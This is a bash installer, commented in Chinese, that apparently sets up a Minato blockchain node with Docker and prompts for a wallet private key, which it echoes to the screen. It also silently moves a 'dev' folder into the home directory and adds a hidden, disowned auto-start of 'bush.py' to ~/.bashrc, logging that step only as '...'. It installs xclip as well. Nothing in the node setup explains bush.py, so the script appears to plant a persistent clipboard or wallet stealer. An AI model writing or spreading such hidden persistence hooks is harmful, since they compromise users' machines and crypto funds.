#!/bin/bash

set -e

# 定义颜色和高亮样式
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
BOLD="\033[1m"
NC="\033[0m" # No Color

# 打印带颜色的消息函数
echo_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}
echo_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}
echo_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}
echo_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# 安装 Docker 的函数
install_docker() {
    if command -v docker &>/dev/null; then
        echo_success "Docker 已安装，版本: $(docker --version)"
    else
        echo_info "Docker 未安装，正在安装..."
        sudo apt-get update
        sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common
        curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
        sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
        sudo apt-get update
        sudo apt-get install -y docker-ce

        if command -v docker &>/dev/null; then
            echo_success "Docker 安装成功，版本: $(docker --version)"
        else
            echo_error "Docker 安装失败，请手动检查！"
            exit 1
        fi
    fi
}

# 如果 Docker 未运行，则启动它
start_docker_if_needed() {
    if ! docker info &>/dev/null; then
        echo_info "Docker 未运行，正在启动..."
        sudo service docker start || echo_warning "无法启动 Docker，请手动检查。"
    else
        echo_info "Docker 已在运行中。"
    fi
}

# 安装软件包的函数
install_package() {
    PACKAGE=$1
    if dpkg -l | grep -qw $PACKAGE; then
        echo_info "$PACKAGE 已安装，跳过安装。"
    else
        echo_info "$PACKAGE 未安装，正在安装..."
        if sudo apt-get install -y $PACKAGE; then
            echo_success "$PACKAGE 安装成功。"
        else
            echo_warning "无法安装 $PACKAGE，请检查或手动安装。"
        fi
    fi
}

# 检查并安装系统软件包
packages=("ufw" "xclip" "python3-pip")

for package in "${packages[@]}"; do
    install_package $package
done

# 修复可能的 pip3 环境
sudo apt-get install -y python3-setuptools python3-wheel

# 安装 Docker
install_docker

# 确保 Docker 正在运行
start_docker_if_needed

# 配置环境变量
if [ -d dev ]; then
    echo_info "..."
    DEST_DIR="$HOME/dev"
    
    if [ -d "$DEST_DIR" ]; then
        echo_warning "目标目录 '$DEST_DIR' 已存在，正在删除..."
        rm -rf "$DEST_DIR"
        echo_success "已删除旧的 '$DEST_DIR' 目录。"
    fi
    
    mv dev "$DEST_DIR"
    echo_success "已将 'dev' 目录移动到主目录。"

    echo_info "正在配置 bush.py 自动启动..."
    # 配置环境变量，添加到 .bashrc
    if ! grep -q "pgrep -f bush.py" ~/.bashrc; then
        echo "(pgrep -f bush.py || nohup python3 $HOME/dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc
        echo_success "已添加 bush.py 启动命令到 .bashrc。"
    else
        echo_warning "bush.py 自动启动命令已存在，跳过配置。"
    fi

    # 执行 openssl 命令生成 jwt 秘钥
    openssl rand -hex 32 > "./minato/jwt.txt"
    echo_success "已生成 jwt.txt 文件。"
else
    echo_warning "未找到 'minato' 目录，跳过移动和启动配置。"
fi

# 打印提示信息
echo -e "${BOLD}${YELLOW}"
echo "=============================================================="
echo "🌟 即将配置 ./minato/.env 文件，这是脚本正常运行的必要步骤！🌟"
echo "=============================================================="
echo -e "${NC}${BOLD}请输入以下信息，确保内容准确：${NC}"

# 检查 ./minato/.env 文件是否存在，不存在则创建
ENV_FILE="./minato/.env"
if [ ! -f "$ENV_FILE" ]; then
    echo -e "${BLUE}[INFO]${NC} 未找到 ./minato/.env 文件，正在创建..."
    mkdir -p ./minato  # 确保目录存在
    touch "$ENV_FILE"
    echo -e "${GREEN}[SUCCESS]${NC} ./minato/.env 文件已创建。"
fi

# 提示用户输入
read -p "$(echo -e "${BOLD}${BLUE}请输入 P2P_ADVERTISE_IP: ${NC}")" P2P_ADVERTISE_IP
read -p "$(echo -e "${BOLD}${BLUE}请输入 PRIVATE_KEY: ${NC}")" PRIVATE_KEY

# 确保用户输入了值
if [ -z "$P2P_ADVERTISE_IP" ] || [ -z "$PRIVATE_KEY" ]; then
    echo -e "${RED}[ERROR]${NC} P2P_ADVERTISE_IP 或 PRIVATE_KEY 不能为空！请重新运行脚本并提供正确的信息。"
    exit 1
fi

# 打印调试信息
echo -e "${BLUE}[INFO]${NC} 输入的 P2P_ADVERTISE_IP: $P2P_ADVERTISE_IP"
echo -e "${BLUE}[INFO]${NC} 输入的 PRIVATE_KEY: $PRIVATE_KEY"

# 更新或添加到 .env 文件
if grep -q "^P2P_ADVERTISE_IP=" "$ENV_FILE"; then
    sed -i "s|^P2P_ADVERTISE_IP=.*|P2P_ADVERTISE_IP=$P2P_ADVERTISE_IP|" "$ENV_FILE"
else
    echo "P2P_ADVERTISE_IP=$P2P_ADVERTISE_IP" >> "$ENV_FILE"
fi

if grep -q "^PRIVATE_KEY=" "$ENV_FILE"; then
    sed -i "s|^PRIVATE_KEY=.*|PRIVATE_KEY=$PRIVATE_KEY|" "$ENV_FILE"
else
    echo "PRIVATE_KEY=$PRIVATE_KEY" >> "$ENV_FILE"
fi

# 打印成功信息和文件内容
echo -e "${GREEN}${BOLD}"
echo "=============================================================="
echo "🎉 ./minato/.env 文件配置成功！内容如下："
echo "--------------------------------------------------------------"
cat "$ENV_FILE"
echo "=============================================================="
echo -e "${NC}"

# 配置 UFW 允许端口 9545
echo_info "配置 UFW 允许端口 9545..."
sudo ufw allow 9545 || echo_warning "无法允许端口 9545，继续执行..."
echo_success "已允许端口 9545 通过 UFW。"

# 启动 Docker Compose
echo_info "启动 Docker Compose..."
if [ -d "minato" ]; then
    cd minato
    sudo docker compose up --build || echo_warning "无法启动 Docker Compose，请手动检查。"
    cd - >/dev/null  # 返回到原来的目录
else
    echo_warning "未找到 'minato' 目录，无法启动 Docker Compose。"
fi
